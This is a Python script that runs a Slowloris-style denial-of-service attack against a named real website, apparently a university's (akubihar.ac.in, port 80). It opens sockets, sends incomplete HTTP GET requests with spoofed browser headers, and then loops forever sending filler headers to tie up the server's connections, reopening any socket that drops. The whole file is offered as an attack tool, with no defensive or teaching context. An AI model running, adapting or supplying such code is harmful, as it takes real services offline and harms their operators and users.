#ADMlNxd SOCKET_AKU
import socket
import random
import time
def Main():
    try:
        global allthesockets
        headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Connection: Keep-Alive"
        ]
        howmany_sockets = 2
        ip = "akubihar.ac.in"
        port = 80
        allthesockets = []
        print("Creating sockets...")
        for k in range(howmany_sockets):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port))
                allthesockets.append(s)
            except Exception as e:
                print(e)
        print(range(howmany_sockets)," sockets are ready.")
        num = 0
        for r in allthesockets:
            print("[",num,"]")
            num += 1 
            r.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            print("Successfully sent [+] GET /? HTTP /1.1 ...")
            for header in headers:
                r.send(bytes("{}\r\n".format(header).encode("utf-8")))
            print("Successfully sent [+] Headers ...")

        while True:
            for v in allthesockets:
                try:
                    v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
                    print("[-][-][*] Waiter sent.")
                except:
                    print("[-] A socket failed, reattempting...")
                    allthesockets.remove(v)
                    try:
                        v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        v.settimeout(4)
                        v.connect((ip,port))
                        #for each socket:
                        v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
                        for header in headers:
                            v.send(bytes("{}\r\n".format(header).encode("utf-8")))
                    except:
                        pass

            print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
            print("Sleeping off ...")
            time.sleep(1)
    except ConnectionRefusedError:
        print("[-] Connection refused, retrying...")
        Main()
    

Main()
